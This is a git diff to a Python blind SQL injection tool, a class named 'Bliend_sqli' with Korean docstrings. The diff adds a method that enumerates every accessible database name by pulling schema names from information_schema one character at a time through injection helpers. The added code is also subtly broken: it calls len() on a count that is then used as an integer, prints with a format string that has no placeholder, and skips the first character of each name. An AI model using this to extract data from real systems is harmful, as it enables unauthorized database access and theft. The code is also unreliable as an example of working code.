@@ -274,13 +274,13 @@ class Bliend_sqli():
     @_cnt_search
     def _cnt_find(data: str, sign: str, i: int) -> str:
         """
-        데이터의 길이 탐색 쿼리문 반환 메서드
+        데이터의 갯수 탐색 쿼리문 반환 메서드
         Args:
             data(str): 갯수를 찾을 데이터 쿼리문
             sign(str): 비교연산자
             i(int): 비교연산에 사용될 값            
         Returns:
-            sql_query(str): 데이터 길이 탐색 쿼리문
+            sql_query(str): 데이터 갯수 탐색 쿼리문
         """
         sp_data = data.split("from")
         sp_data[0] = sp_data[0].replace("select", "")
@@ -494,6 +494,38 @@ class Bliend_sqli():
                 print (db_data) 
         print (db_data) 
         return db_data
+    
+    def db_all_name(self) -> list[str]:
+        """
+        접근 가능한 모든 DB명을 반환하는 메서드.
+        Returns:
+            db_all(list[str]): 접근 가능한 모든 DB명 반환
+        """
+        
+        # select schema_name from information_schema.schemata limit 0,1
+        db_len = []
+        db_name = []
+        #컬럼 갯수 추출
+        sql_data = "select schema_name from information_schema.schemata"          
+        db_cnt = self._cnt_find(sql_data)
+
+        # db 길이 추출
+        for j in range (0, len(db_cnt)):
+            sql_data_len = "%s limit %s,1"%(sql_data, j)
+            d_len = self._len_find(sql_data_len)                
+            db_len.append(d_len)
+    
+    
+        # db 명 추출
+        for k in range(0, db_cnt):
+            db_name.append("")
+            for l in range(1, db_len[k]): # 맨 앞 더블쿼터 제거
+                sql_data_len = "%s limit %s,1"%(sql_data, k)                
+                t_name = self._char_search(sql_data_len, l)
+                db_name[k] += t_name
+        print("DB Name : "%db_name)
+        self.db_name_all = db_name
+        return db_name
 
 
 
